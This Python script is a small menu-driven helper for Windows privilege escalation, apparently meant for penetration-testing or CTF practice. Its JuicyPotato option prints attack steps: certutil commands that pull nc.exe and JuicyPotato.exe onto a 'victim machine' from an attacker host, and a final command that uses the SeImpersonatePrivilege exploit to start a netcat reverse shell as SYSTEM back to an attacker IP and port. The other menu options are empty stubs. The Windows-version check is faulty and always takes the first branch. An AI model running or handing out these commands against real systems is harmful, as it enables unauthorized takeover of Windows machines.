#! /usr/bin/python3
class args():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--system", type=str, help="Windows System")
    args = parser.parse_args()

menu_options = {
    1: 'ImpersonatePrivilege Enabled - JuicyPotato',
    2: 'Option 2',
    3: 'Option 3',
    4: 'Exit',
}

def print_menu():
    for key in menu_options.keys():
        print (key, '--', menu_options[key] )

def JuicyPotato():
    ImpersonatePrivilege = input("Is SeImpersonatePrivilege Enabled (y|n) ")
    if ImpersonatePrivilege == "y":
        print('''Instructions
---------------------------------------------------------------------------------------------------------------------------------------------

        1. Upload nc.exe and JuicyPotato.exe onto the victim machine
            1.1 certutil.exe -urlcache -split -f http://X.X.X.X/nc.exe nc.exe 
            1.2 certutil.exe -urlcache -split -f http://X.X.X.X/JuicyPotato.exe jp.exe 
        2. Find the system information with this command: systeminfo
        3. run netcat on a localport such as 4242''')
        if args.args.system == "Microsoft Windows Server 2008 R2 Datacenter" or "Windows Server 2008 R2 Enterprise":
            print("4. Find the CLSID for the next command here: https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/")
        elif args.args.system == "Windows 7 Enterprise":
            print("4. Find the CLSID for the next command here: https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/")
        elif args.args.system == "Windows 8.1 Enterprise":
            print("4. Find the CLSID for the next command here: https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise/")
        elif args.args.system == "Windows 10 Enterprise":
            print("4. Find the CLSID for the next command here: https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/")
        elif args.args.system == "Windows 10 Pro":
            print("4. Find the CLSID for the next command here: https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/")
        elif args.args.system == "Windows Server 2016 Standard":
            print("4. Find the CLSID for the next command here: https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/")
        elif args.args.system == "Windows Server 2012 Datacenter":
            print("4. Find the CLSID for the next command here: https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/")
        print('''5. run this command to get a shell: jp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe Attack_IP Attack_Port" –t * –c CLSID  
---------------------------------------------------------------------------------------------------------------------------------------------''')
            

def option2():
     print('Handle option \'Option 2\'')

def option3():
     print('Handle option \'Option 3\'')

if __name__=='__main__':
    while(True):
        print_menu()
        option = ''
        try:
            option = int(input('Enter your choice: '))
        except:
            print('Wrong input. Please enter a number ...')
        #Check what choice was entered and act accordingly
        if option == 1:
            JuicyPotato()
        elif option == 2:
            option2()
        elif option == 3:
            option3()
        elif option == 4:
            print('Thanks message before exiting')
            exit()
        else:
            print('Invalid option. Please enter a number between 1 and 4.')
